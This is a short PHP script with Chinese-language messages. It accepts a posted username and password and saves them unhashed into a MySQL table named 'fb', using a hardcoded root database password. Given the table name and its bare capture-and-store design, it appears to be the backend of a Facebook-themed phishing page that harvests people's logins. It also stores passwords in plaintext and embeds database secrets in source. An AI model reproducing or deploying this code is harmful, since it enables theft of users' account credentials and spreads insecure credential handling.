<?php


if ($_SERVER["REQUEST_METHOD"] == "POST") {

    if (isset($_POST["username"]) && isset($_POST["password"])) {
        

        $username = $_POST["username"];
        $password = $_POST["password"];


        $host = "127.0.0.1:3306";
        $dbusername = "root";
        $dbpassword = "a94033143";
        $dbname = "Changg";


        $conn = mysqli_connect($host, $dbusername, $dbpassword, $dbname);


        if ($conn->connect_error) {
            die("連線失敗: " . $conn->connect_error);
        }


        $stmt = $conn->prepare("INSERT INTO fb (username, password) VALUES (?, ?)");
        

        if ($stmt === false) {
            die("處理失败: " . $conn->error);
        }

        $stmt->bind_param("ss", $username, $password);


        if ($stmt->execute()) {
            echo "帳號密碼已成功儲存到 MySQL 資料庫。";
        } else {
            echo "錯誤: " . $stmt->error;
        }


        $stmt->close();
        $conn->close();
    } else {
        echo "帳號和密碼未提供或為空";
    }
} else {
    echo "只接受 POST 請求";
}

?>
